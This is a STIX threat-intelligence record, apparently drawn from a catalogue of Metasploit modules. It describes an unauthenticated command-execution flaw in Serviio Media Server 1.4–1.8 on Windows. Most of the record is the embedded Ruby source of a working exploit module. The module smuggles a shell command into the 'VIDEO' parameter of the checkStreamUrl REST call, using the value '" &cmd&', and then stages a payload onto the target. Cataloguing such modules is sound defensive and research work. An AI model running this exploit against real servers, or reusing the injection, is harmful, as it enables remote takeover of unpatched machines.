{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9d63d444-093e-4aae-a448-bebb062290c5",
    "created": "2024-08-14T16:55:21.769563Z",
    "modified": "2024-08-14T16:55:21.769567Z",
    "name": "Serviio Media Server checkStreamUrl Command Execution",
    "description": " This module exploits an unauthenticated remote command execution vulnerability in the console component of Serviio Media Server versions 1.4 to 1.8 on Windows operating systems.  The console service (on port 23423 by default) exposes a REST API which which does not require authentication.  The 'action' API endpoint does not sufficiently sanitize user-supplied data in the 'VIDEO' parameter of the 'checkStreamUrl' method. This parameter is used in a call to cmd.exe resulting in execution of arbitrary commands.  This module has been tested successfully on Serviio Media Server versions 1.4.0, 1.5.0, 1.6.0 and 1.8.0 on Windows 7.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/serviio_checkstreamurl_cmd_exec.rb",
            "external_id": "serviio_checkstreamurl_cmd_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5408.php"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.securiteam.com/index.php/archives/3094"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Restlet-Framework/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Serviio Media Server checkStreamUrl Command Execution',\n      'Description'    => %q{\n        This module exploits an unauthenticated remote command execution vulnerability\n        in the console component of Serviio Media Server versions 1.4 to 1.8 on\n        Windows operating systems.\n\n        The console service (on port 23423 by default) exposes a REST API which\n        which does not require authentication.\n\n        The 'action' API endpoint does not sufficiently sanitize user-supplied data\n        in the 'VIDEO' parameter of the 'checkStreamUrl' method. This parameter is\n        used in a call to cmd.exe resulting in execution of arbitrary commands.\n\n        This module has been tested successfully on Serviio Media Server versions\n        1.4.0, 1.5.0, 1.6.0 and 1.8.0 on Windows 7.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Gjoko Krstic(LiquidWorm) <gjoko[at]zeroscience.mk>', # Discovery and exploit\n          'bcoles', # Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '41961'],\n          ['PACKETSTORM', '142387'],\n          ['URL', 'http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5408.php'],\n          ['URL', 'https://blogs.securiteam.com/index.php/archives/3094']\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Automatic Targeting', { 'auto' => true }]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2017-05-03',\n      'DefaultTarget'  => 0))\n    register_options([ Opt::RPORT(23423) ])\n  end\n\n  def check\n    res = execute_command('')\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    if res.headers['Server'] !~ /Serviio/\n      vprint_status 'Target is not a Serviio Media Server'\n      return CheckCode::Safe\n    end\n\n    if res.headers['Server'] !~ /Windows/\n      vprint_status 'Target operating system is not vulnerable'\n      return CheckCode::Safe\n    end\n\n    if res.code != 200 || res.body !~ %r{<errorCode>603</errorCode>}\n      vprint_status 'Unexpected reply'\n      return CheckCode::Safe\n    end\n\n    if res.headers['Server'] =~ %r{Serviio/(1\\.[4-8])}\n      vprint_status \"#{peer} Serviio Media Server version #{$1}\"\n      return CheckCode::Appears\n    end\n\n    CheckCode::Safe\n  end\n\n  def execute_command(cmd, opts = {})\n    data = { 'name' => 'checkStreamUrl', 'parameter' => ['VIDEO', \"\\\" &#{cmd}&\"] }\n    send_request_cgi('uri'    => normalize_uri(target_uri.path, 'rest', 'action'),\n                     'method' => 'POST',\n                     'ctype'  => 'application/json',\n                     'data'   => data.to_json)\n  end\n\n  def exploit\n    fail_with(Failure::NotVulnerable, 'Target is not vulnerable') unless check == CheckCode::Appears\n    execute_cmdstager(:temp => '.', :linemax => 8000)\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-05-03",
    "x_mitre_platforms": [
        "win'"
    ]
}